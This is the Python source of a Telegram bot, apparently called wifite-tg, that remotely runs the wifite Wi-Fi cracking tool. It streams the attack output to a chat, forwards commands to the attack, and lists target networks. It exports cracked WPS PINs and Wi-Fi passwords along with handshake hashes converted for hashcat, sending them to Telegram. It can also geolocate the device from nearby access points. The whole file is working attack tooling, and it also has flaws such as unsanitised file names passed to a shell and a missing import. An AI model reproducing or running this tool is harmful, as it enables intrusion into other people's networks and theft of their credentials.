import io
import signal
import re
import subprocess
import threading
import time
import telebot
import json
import os
import glob
import traceback
import requests
import argparse

banner = '''
            _     ___  _                                   
           (_)   / __)(_)   _                    _         
     _ _ _  _  _| |__  _  _| |_  _____  _____  _| |_  ____ 
    | | | || |(_   __)| |(_   _)| ___ |(_____)(_   _)/ _  |
    | | | || |  | |   | |  | |_ | ____|         | |_( (_| |
     \___/ |_|  |_|   |_|   \__)|_____)          \__)\___ |
                                                    (_____|

     wifite-tg v1.0
     https://github.com/itschesko/wifite-tg\n\n'''

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message

print(f"{banner}");
parser = argparse.ArgumentParser(description="", formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('--token', '-t', help="Telegram bot token (or env WIFITE_TOKEN)")
parser.add_argument('--user-id', '-u', type=int, help="Telegram admin user ID (or env WIFITE_USER_ID)")
parser.add_argument('--google-api-key', '-g', help="Google Geolocation API key (or env WIFITE_GOOGLE_KEY)")
parser.add_argument('--iface', '-i', default=None, help="Wi-Fi interface for geolocation (default wlan0 or env WIFITE_IFACE)")
args = parser.parse_args()

TOKEN = os.getenv('WIFITE_TOKEN') or args.token
if not TOKEN:
    print("❌ Telegram bot token not provided.")
    exit(1)

try:
    ALLOWED_USER_ID = int(os.getenv('WIFITE_USER_ID') or args.user_id)
except (TypeError, ValueError):
    print("❌ Admin user ID not provided or invalid.")
    exit(1)

GOOGLE_API_KEY = os.getenv('WIFITE_GOOGLE_KEY') or (args.google_api_key or '')
MANAGED_IFACE = os.getenv('WIFITE_IFACE') or (args.iface or 'wlan0')

bot = telebot.TeleBot(TOKEN)

process = None
output_buffer = []
buffer_lock = threading.Lock()
watcher_thread = None
running = False
message_info = {}
last_update_time = 0
force_update_requested = False
MAX_CHARS = 3800
UPDATE_INTERVAL = 5

control_markup = InlineKeyboardMarkup(row_width=2).add(
    InlineKeyboardButton("⏹ Stop", callback_data="stop_wifite"),
    InlineKeyboardButton("📄 Export Hashes", callback_data="export_results"),
    InlineKeyboardButton("📊 Parse Table", callback_data="parse_table"),
    InlineKeyboardButton("🔃 Refresh", callback_data="refresh"),
)

ansi_escape = re.compile(r'(\x1B\[[0-?]*[ -/]*[@-~])|\[\d;]*m')
blank_line = re.compile(r'^\s*$')

def clean_output(text):
    lines = text.splitlines()
    out = []
    for line in lines:
        s = ansi_escape.sub('', line).rstrip()
        s = s.replace("stty: 'standard input': Inappropriate ioctl for device", "")
        if not blank_line.match(s):
            out.append(s)
    return "\n".join(out)

def start_watcher():
    global watcher_thread, running
    if watcher_thread and watcher_thread.is_alive():
        return
    running = True
    watcher_thread = threading.Thread(target=watch_output, daemon=True)
    watcher_thread.start()

def watch_output():
    global running, force_update_requested
    while running and process and process.poll() is None:
        time.sleep(0.5)
        if force_update_requested:
            send_update(final=False, force=True)
            force_update_requested = False
    time.sleep(0.1)
    try:
        rem = process.stdout.read()
        if rem:
            with buffer_lock:
                output_buffer.append(rem)
    except:
        pass
    send_update(final=True)
    running = False

def send_update(final=False, force=False):
    global last_update_time
    now = time.time()
    if not final and not force and now - last_update_time < UPDATE_INTERVAL:
        return
    last_update_time = now
    with buffer_lock:
        buf = "".join(output_buffer)
    buf = buf or ("(waiting for output...)" if not final else "")
    buf = clean_output(buf)
    if len(buf) > MAX_CHARS and not final:
        buf = buf[-MAX_CHARS:]
    msg = f"```python\n{buf}\n```"
    kwargs = {'parse_mode': 'Markdown'}
    if not final:
        kwargs['reply_markup'] = control_markup
    try:
        bot.edit_message_text(msg, message_info['chat_id'], message_info['message_id'], **kwargs)
    except telebot.apihelper.ApiException:
        pass

def read_stdout():
    buf = ""
    while True:
        ch = process.stdout.read(1)
        if not ch:
            break
        with buffer_lock:
            output_buffer.append(ch)
        buf += ch
        if buf.endswith(": ") or "Press Enter" in buf:
            send_update(final=False)
            buf = ""

def scan_wifi():
    try:
        out = subprocess.check_output(['sudo','iwlist',MANAGED_IFACE,'scan'],stderr=subprocess.DEVNULL,text=True)
    except subprocess.CalledProcessError:
        return []
    aps = []
    for cell in out.split('Cell '):
        m = re.search(r'Address: ([0-9A-F:]{17})', cell)
        s = re.search(r'Signal level=(-?\d+) dBm', cell)
        if m and s:
            aps.append({'macAddress':m.group(1),'signalStrength':int(s.group(1))})
    return aps

def geolocate():
    if GOOGLE_API_KEY:
        aps = scan_wifi()
        if aps:
            body = {'wifiAccessPoints':aps}
            url = f'https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}'
            r = requests.post(url,json=body,timeout=5)
            if r.ok:
                loc = r.json().get('location',{})
                return loc.get('lat'),loc.get('lng'),'Google API'
    r = requests.get('http://ip-api.com/json',timeout=5).json()
    return float(r.get('lat',0)),float(r.get('lon',0)),'IP-API'

@bot.message_handler(commands=['wifite'])
def cmd_wifite(msg: Message):
    global process, output_buffer, message_info
    if msg.from_user.id!=ALLOWED_USER_ID:
        return bot.reply_to(msg,"Unauthorized.")
    if process and process.poll() is None:
        return bot.reply_to(msg,"Wifite already running.")
    process = subprocess.Popen('stdbuf -oL -eL wifite',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1,executable='/bin/bash')
    with buffer_lock:
        output_buffer.clear()
    sent = bot.send_message(msg.chat.id,"```python\nStarting wifite...\n```",reply_markup=control_markup,parse_mode='Markdown')
    message_info={'chat_id':msg.chat.id,'message_id':sent.message_id}
    start_watcher()
    threading.Thread(target=read_stdout,daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data in ('stop_wifite','switch_monitor','export_results','refresh','parse_table'))
def cb_controls(call: CallbackQuery):
    global force_update_requested
    if call.from_user.id!=ALLOWED_USER_ID:
        return bot.answer_callback_query(call.id,"Unauthorized.")
    if call.data=='stop_wifite':
        if process and process.poll() is None:
            process.send_signal(signal.SIGINT)
            bot.answer_callback_query(call.id,"Sent Ctrl+C.")
        else:
            bot.answer_callback_query(call.id,"No process.")
    elif call.data=='switch_monitor':
        if process and process.poll() is None:
            try:
                process.stdin.write("m\n");process.stdin.flush()
                bot.answer_callback_query(call.id,"Toggled monitor.")
            except:
                bot.answer_callback_query(call.id,"Failed toggle.")
        else:
            bot.answer_callback_query(call.id,"No process.")
    elif call.data=='export_results':
        bot.answer_callback_query(call.id,"Exporting…")
        try:export_results(call.message.chat.id)
        except Exception as e:bot.send_message(call.message.chat.id,f"Error: {e}")
    elif call.data=='refresh':
        force_update_requested=True
        bot.answer_callback_query(call.id,"Refresh queued.")
    elif call.data=='parse_table':
        with buffer_lock:
            txt=clean_output("".join(output_buffer))
        lines=[l for l in txt.splitlines() if re.match(r'^\s*\d+\s+',l)]
        parsed={}
        for l in lines:
            parts=re.split(r'\s{2,}',l.strip())
            if len(parts)>=6:
                num,essid,encr,power,wps=parts[0],parts[1],parts[3],parts[4],parts[5]
                client=parts[6] if len(parts)>6 else '-'
                parsed[int(num)]=f"[{num}] [{encr}{' •' if wps=='yes' else ''}] [{client}] [{power}] {essid}"
        if not parsed:
            bot.send_message(call.message.chat.id,"No table data.")
        else:
            chunk=""
            for k in sorted(parsed):
                line=parsed[k]+"\n"
                if len(chunk)+len(line)>MAX_CHARS:
                    bot.send_message(call.message.chat.id,f"```\n{chunk}```",parse_mode='Markdown');chunk=""
                chunk+=line
            if chunk:bot.send_message(call.message.chat.id,f"```\n{chunk}```",parse_mode='Markdown')
        bot.answer_callback_query(call.id,"Table parsed.")

@bot.message_handler(commands=['hashes'])
def cmd_hashes(msg: Message):
    if msg.from_user.id!=ALLOWED_USER_ID:
        return bot.reply_to(msg,"Unauthorized.")
    bot.send_chat_action(msg.chat.id,'typing')
    export_results(msg.chat.id)

def export_results(chat_id):
    lines = []
    
    if os.path.exists("cracked.txt"):
        with open("cracked.txt") as f:
            data = json.load(f)
        for e in data:
            lines.append(f"[WPS] SSID={e.get('essid','?')} TYPE={e.get('type')} "
                         f"PIN={e.get('pin')} PSK={e.get('psk')}")
    else:
        lines.append("[!] cracked.txt missing")
    
    for cap in glob.glob("hs/*.cap"):
        ssid = os.path.basename(cap).split("_")[1] if "_" in cap else "?"
        out = "output.hc22000"
        subprocess.run(
            f"hcxpcapngtool -o {out} {cap}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if os.path.exists(out):
            with open(out) as hf:
                h = hf.read().strip()
            lines.append(f"\n\n{ssid}:\n\n{h}")
            os.remove(out)
        else:
            lines.append(f"\n\n{ssid}:\n\n<no hash>")
    payload = "\n".join(lines)
    if len(payload) < 3500:
        bot.send_message(chat_id, f"```python\n{payload}\n```", parse_mode='Markdown')
    else:
        bio = io.BytesIO(payload.encode()); bio.name = "results.txt"
        bot.send_document(chat_id, bio, caption="Exported Results")


@bot.message_handler(commands=['geo'])
def cmd_geo(msg: Message):
    if msg.from_user.id!=ALLOWED_USER_ID:
        return bot.reply_to(msg,"Unauthorized.")
    bot.send_chat_action(msg.chat.id,'find_location')
    try:
        lat,lng,provider=geolocate()
        bot.send_location(msg.chat.id,lat,lng)
        bot.send_message(msg.chat.id,f"Source: {provider}")
    except Exception as e:bot.reply_to(msg,f"Geo error: {e}")

@bot.message_handler(func=lambda m: True)
def handle_input(m: Message):
    if m.chat.id!=message_info.get('chat_id') or m.from_user.id!=ALLOWED_USER_ID:
        return
    if process and process.poll() is None:
        try:process.stdin.write(m.text+'\n');process.stdin.flush()
        except:pass

def main():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__=='__main__':
    print(f"     \033[92m[📡] The bot has started\033[0m")
    bot.send_message(ALLOWED_USER_ID,"[📡] wifite-tg is connected @ https://github.com/itschesko/wifite-tg")
    bot.infinity_polling(timeout=10,long_polling_timeout=5)
    
    while True:
        try:main()
        except KeyboardInterrupt:
            print("\nInterrupted by user, shutting down.")
            sys.exit(0)
        except Exception as e:
            tb=traceback.format_exc()
            try:bot.send_message(ALLOWED_USER_ID,f"⚠️ Bot crashed:\n{e}\nRestarting…")
            except:print("Notify fail")
            print(tb)
            time.sleep(5)
